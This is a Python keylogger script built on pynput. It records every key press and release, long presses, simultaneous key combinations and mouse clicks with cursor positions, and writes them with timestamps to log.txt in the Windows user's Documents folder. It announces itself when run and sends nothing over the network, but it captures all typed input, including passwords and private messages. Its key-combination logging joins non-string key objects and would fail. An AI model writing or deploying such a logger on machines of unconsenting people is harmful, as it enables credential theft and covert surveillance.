import getpass as gp
import os
from datetime import datetime
import pynput as inp
import time as t

user = gp.getuser()
log_file = f"C:/Users/{user}/Documents/log.txt"
long_press_threshold = 1   # seconds

if not os.path.exists(os.path.dirname(log_file)):
    os.makedirs(os.path.dirname(log_file))

with open(log_file, "w"):
    pass

pressed_keys = set()
last_press_times = {}
multiple_keys = []

def on_press(key):
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    x, y = inp.mouse.Controller().position
    entry = f"{current_time} - Key Pressed: {key}, Position: ({x},{y})\n"

    with open(log_file, "a") as log:
        log.write(entry)

    pressed_keys.add(key)
    last_press_times[key] = datetime.now()

    # Check for simultaneous key presses
    check_simultaneous_keys()

def on_release(key):
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    x, y = inp.mouse.Controller().position
    elapsed_time = (datetime.now() - last_press_times[key]).total_seconds()

    if elapsed_time > long_press_threshold:
        entry = f"{current_time} - Long Press Released: {key}, Position: ({x},{y}), Duration: {elapsed_time} sec\n"
    else:
        entry = f"{current_time} - Key Released: {key}, Position: ({x},{y})\n"

    with open(log_file, "a") as log:
        log.write(entry)

    # Remove the released key from the sets and list
    del last_press_times[key]
    pressed_keys.remove(key)
    remove_key_from_list(key)

def on_click(x, y, button, pressed):
    if pressed:
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
        entry = f"{current_time} - Mouse Clicked at Position: ({x},{y}), Button: {button}\n"

        with open(log_file, "a") as log:
            log.write(entry)

def on_move(x, y):
    # Don't write anything to the file during a move event
    pass

def check_simultaneous_keys():
    global multiple_keys
    new_multiple_keys = list(pressed_keys)
    intersect = set(new_multiple_keys).intersection(set(multiple_keys))

    if len(intersect) != len(multiple_keys):
        # Log any changes in the set of pressed keys
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
        entry = f"{current_time} - Simultaneously Pressed Keys: {' '.join(new_multiple_keys)}\n"

        with open(log_file, "a") as log:
            log.write(entry)

        multiple_keys = new_multiple_keys

def remove_key_from_list(key):
    try:
        multiple_keys.remove(key)
    except ValueError:
        pass

def main():
    global go
    print("Keylogger started...")
    with open(log_file, 'a') as f:
        f.write('\n')
    keyboard_listener = inp.keyboard.Listener(on_press=on_press, on_release=on_release)
    keyboard_listener.start()

    mouse_controller = inp.mouse.Controller()
    mouse_listener = inp.mouse.Listener(on_click=on_click, on_move=on_move)
    mouse_listener.start()

    try:
        while True:
            t.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
        keyboard_listener.stop()
        mouse_listener.stop()
        keyboard_listener.join()
        mouse_listener.join()

if __name__ == "__main__":
    main()
